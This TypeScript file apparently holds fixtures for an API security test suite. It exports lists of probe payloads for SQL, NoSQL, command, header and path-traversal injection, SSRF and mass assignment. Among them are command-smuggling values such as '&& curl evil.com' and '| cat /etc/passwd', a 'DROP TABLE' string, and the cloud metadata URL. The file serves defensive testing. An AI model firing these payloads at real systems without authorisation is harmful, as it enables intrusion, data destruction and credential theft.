/** SQL injection probe payloads — expect 4xx, never SQL error leakage */
export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "1; DROP TABLE users--",
  "admin'--",
  "' UNION SELECT null,null--",
  "1' AND SLEEP(5)--",
  "') OR ('1'='1",
];

/** NoSQL / JSON injection probes */
export const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt":""}',
  '{"$ne":null}',
  '{"$where":"this.password.length > 0"}',
  '{"username":{"$regex":".*"}}',
];

/** Command injection probes */
export const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '$(whoami)',
  '`id`',
  '&& curl evil.com',
];

/** Header injection probes */
export const HEADER_INJECTION_PAYLOADS = [
  'value\r\nX-Injected: true',
  'test%0d%0aSet-Cookie: evil=1',
];

/** Path traversal probes */
export const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\windows\\system32',
  '%2e%2e%2f%2e%2e%2fetc/passwd',
  '....//....//etc/passwd',
];

/** SSRF probe URLs */
export const SSRF_PAYLOADS = [
  'http://127.0.0.1/admin',
  'http://localhost:6379',
  'http://169.254.169.254/latest/meta-data/',
  'file:///etc/passwd',
  'http://[::1]/',
];

/** Mass assignment probe fields */
export const MASS_ASSIGNMENT_FIELDS = [
  'isAdmin',
  'role',
  'roles',
  'permissions',
  'dataScope',
  'status',
  'userType',
  'branchId',
  'regionId',
];
